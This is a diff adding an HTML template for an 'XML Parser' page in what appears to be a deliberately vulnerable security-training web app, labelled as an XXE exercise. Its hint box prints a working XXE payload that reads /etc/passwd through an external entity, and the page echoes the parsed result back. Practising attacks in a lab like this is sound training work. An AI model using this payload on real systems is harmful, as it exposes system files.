@@ -1,0 +1,47 @@
+{% extends "base.html" %}
+
+{% block title %}XML Parser{% endblock %}
+
+{% block content %}
+<div class="container" style="max-width: 700px;">
+    <div class="card">
+        <div class="card-header">
+            <div class="card-icon orange">📋</div>
+            <div>
+                <h2>XML Parser</h2>
+                <span class="vuln-tag xss">XXE (XML External Entity)</span>
+            </div>
+        </div>
+        
+        <form method="POST">
+            <div class="form-group">
+                <label for="xml">XML Data</label>
+                <textarea id="xml" name="xml" placeholder="Enter XML to parse...">&lt;?xml version="1.0"?&gt;
+&lt;data&gt;
+    &lt;message&gt;Hello, World!&lt;/message&gt;
+&lt;/data&gt;</textarea>
+            </div>
+            <button type="submit" class="btn btn-primary">Parse XML →</button>
+        </form>
+        
+        <div class="hint" style="margin-top: 1rem;">
+            Try XXE payload:<br>
+            <code style="font-size: 0.8rem;">
+&lt;?xml version="1.0"?&gt;<br>
+&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;<br>
+&lt;data&gt;&amp;xxe;&lt;/data&gt;
+            </code>
+        </div>
+    </div>
+    
+    {% if result %}
+    <div class="card">
+        <h3 style="margin-bottom: 1rem;">📤 Parse Result</h3>
+        <div class="code-block">
+            <pre style="white-space: pre-wrap; word-break: break-all;">{{ result }}</pre>
+        </div>
+    </div>
+    {% endif %}
+</div>
+{% endblock %}
+
